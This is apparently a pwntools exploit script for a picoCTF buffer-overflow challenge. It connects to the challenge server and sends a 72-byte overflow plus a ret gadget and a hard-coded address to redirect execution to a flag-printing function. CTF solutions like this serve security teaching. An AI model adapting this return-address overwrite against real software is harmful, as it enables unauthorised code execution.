from pwn import *
from struct import *

exe = ELF("./vuln", checksec=False)
context.binary = exe
context.terminal = "konsole -e".split()

# p = process()
p = remote("saturn.picoctf.net", 57792)
# attach(p, gdbscript="""break *vuln""")
payload = b""
payload += b"A"*72
payload += pack("<Q", ROP(exe).find_gadget(["ret"])[0])
payload += pack("<Q", 0x401236)
p.sendlineafter(b"Give me a string that gets you the flag:", payload)
p.interactive()